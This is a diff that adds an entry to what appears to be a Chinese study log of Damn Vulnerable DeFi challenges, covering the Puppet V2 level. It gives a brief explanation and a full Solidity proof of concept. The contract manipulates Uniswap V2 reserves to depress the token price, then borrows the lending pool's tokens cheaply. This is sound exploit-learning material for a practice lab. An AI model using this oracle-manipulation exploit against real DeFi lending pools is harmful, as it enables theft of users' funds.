@@ -712,6 +712,56 @@ contract CallPuppet{
 
 ### 2024.09.06
 
+#### puppet v2
+
+一样的，使用了v2的reserve计算价格，可以向池内注入大量token拉低其价格。
+
+poc：
+
+```
+    function test_puppetV2() public checkSolvedByPlayer {
+        console.logAddress(address(weth));
+        CallPuppet cp=new CallPuppet(address(token),address(lendingPool),address(uniswapV2Router),address(weth));
+        token.transfer(address(cp), token.balanceOf(player));
+        cp.start{value:20 ether}(recovery, address(uniswapV2Exchange));
+    }
+    
+contract CallPuppet{
+    DamnValuableToken token;
+    PuppetV2Pool lendingPool;
+    IUniswapV2Router02 router;
+    WETH weth;
+    constructor(address dvt,address pp,address r,address _weth){
+        token=DamnValuableToken(dvt);
+        lendingPool=PuppetV2Pool(pp);
+        router=IUniswapV2Router02(r);
+        weth=WETH(payable(_weth));
+    }
+
+    function start(address recovery,address unipool)public payable{
+
+        token.approve(address(router),type(uint256).max);
+        console.log(token.balanceOf(address(this)));
+        address[] memory path=new address[](2);
+        path[0]=address(token);
+        path[1]=address(weth);
+       
+        router.swapExactTokensForETH(1e4*1e18, 0, path,address(this),block.timestamp+1 days);
+        uint amount = lendingPool.calculateDepositOfWETHRequired(1e6*1e18);
+        console.logUint(amount);
+        uint256 depositValue = amount - weth.balanceOf(address(this));//差的weth去兑换补足
+        weth.deposit{value:depositValue}();
+        weth.approve(address(lendingPool), amount);
+        lendingPool.borrow(1e6*1e18);
+        token.transfer(recovery, token.balanceOf(address(this)));
+    }
+    receive()payable external{
+
+    }
+}
+```
+
+
 
 ### 2024.09.07
 
